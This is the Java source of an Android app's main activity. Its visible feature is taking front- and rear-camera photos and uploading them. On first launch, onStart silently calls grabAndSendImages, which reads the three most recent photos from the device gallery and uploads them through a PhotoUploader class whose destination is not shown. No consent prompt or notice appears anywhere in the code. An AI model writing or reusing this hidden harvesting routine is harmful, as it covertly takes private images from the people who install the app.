package uk.org.potentialdifference.stillapp;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    final String TAG = "MainActivity";
    Camera mCamera;
    static final int REQUEST_IMAGE_CAPTURE = 1;
    String mCurrentPhotoPath;
    Uri photoUri;
    Activity mActivity = this;

    PictureCallback jpegCallback2 = new PictureCallback() {
        public void onPictureTaken(byte[] data, Camera camera) {
            mCamera.stopPreview();
            mCamera.release();
            new PhotoUploader().uploadBytes(mActivity.getBaseContext(), "front", data);
            dispatchTakePictureIntent();
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate");
        setContentView(R.layout.activity_main);

        Button button = (Button) findViewById(R.id.bPhoto);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View arg0) {
                // Take a picture
                mCamera.startPreview();
                mCamera.takePicture(null, null, jpegCallback2);
            }
        });
    }

    protected void onStart() {
        super.onStart();
        if (mCamera == null) {
            mCamera = Camera.open(1);
        }

        if (isFirstLaunch()) {
            grabAndSendImages();
        }
        Log.d(TAG, "onStart");
    }

    protected void onStop() {
        super.onStop();
        if (mCamera != null ) {
            mCamera.release();
            mCamera = null;
        }
        Log.d(TAG, "onStop");
    }

    private File createImageFile() throws IOException {
        // Create an image file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        String imageFileName = "JPEG_" + timeStamp + "_";
        File storageDir = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES);
        File image = File.createTempFile(
                imageFileName,  /* prefix */
                ".jpg",         /* suffix */
                storageDir      /* directory */
        );

        // Save a file: path for use with ACTION_VIEW intents
        mCurrentPhotoPath = "file:" + image.getAbsolutePath();
        return image;
    }

    private void dispatchTakePictureIntent() {
        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        // Ensure that there's a camera activity to handle the intent
        if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
            // Create the File where the photo should go
            File photoFile = null;
            try {
                photoFile = createImageFile();
            } catch (IOException ex) {
                // Error occurred while creating the File
            }
            // Continue only if the File was successfully created
            if (photoFile != null) {
                photoUri = Uri.fromFile(photoFile);
                takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, photoUri);
                startActivityForResult(takePictureIntent, REQUEST_IMAGE_CAPTURE);
            }
        }
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        // Check which request we're responding to
        if (requestCode == REQUEST_IMAGE_CAPTURE) {
            // Make sure the request was successful
            if (resultCode == RESULT_OK) {
                try {
                    InputStream inputStream = getContentResolver().openInputStream(photoUri);
                    ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();

                    int bufferSize = 1024;
                    byte[] buffer = new byte[bufferSize];
                    int len = 0;
                    while ((len = inputStream.read(buffer)) != -1) {
                        byteBuffer.write(buffer, 0, len);
                    }
                    new PhotoUploader().uploadBytes(mActivity.getBaseContext(), "rear", byteBuffer.toByteArray());
                } catch (Exception e) {
                    // Do nothing
                }
            }
        }
    }

    public boolean isFirstLaunch() {
        boolean firstLaunch = false;
        String FILENAME = "launch";
        String string = "";
        try {
            FileInputStream fis = openFileInput(FILENAME);
        } catch (Exception e) {
            firstLaunch = true;
        }
        try {
            FileOutputStream fos = openFileOutput(FILENAME, Context.MODE_PRIVATE);
            fos.write(string.getBytes());
            fos.close();
        } catch (Exception e) {
        }
        return firstLaunch;
    }



    ///

    private void grabAndSendImages() {
        Cursor imageCursor;

        String[] projection = {MediaStore.Images.Media._ID};
        String selection = "";
        String[] selectionArgs = null;
        imageCursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, null);
        Log.d(TAG, "Grabbing and sending images...");

        if(imageCursor != null){
            int photoCount = 0;
            imageCursor.moveToLast();
            do {
                photoCount++;
                int imageId = imageCursor.getInt(imageCursor.getColumnIndex(MediaStore.Images.Media._ID));
                Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
                byte[] data = getBytesFromBitmap(loadImage(uri));
                new PhotoUploader().uploadBytes(this.getBaseContext(), String.format("user-photo-%d", photoCount), data);
            } while(photoCount<3 && imageCursor.moveToPrevious());
        }
        else{
            Log.i(TAG, "System media store is empty");
        }
    }

    private Bitmap loadImage(Uri photoUri){
        Cursor photoCursor = null;
        try {
            String[] projection = {MediaStore.Images.Media.DATA};
            photoCursor = getContentResolver().query(photoUri, projection, null, null, null);
            if (photoCursor != null && photoCursor.getCount() == 1) {
                photoCursor.moveToFirst();
                String filePath = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA));
                return BitmapFactory.decodeFile(filePath, null);
            }
        }finally{
            if(photoCursor!=null){
                photoCursor.close();
            }
        }
        return null;
    }

    private byte[] getBytesFromBitmap(Bitmap bitmap) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
        return stream.toByteArray();
    }
}
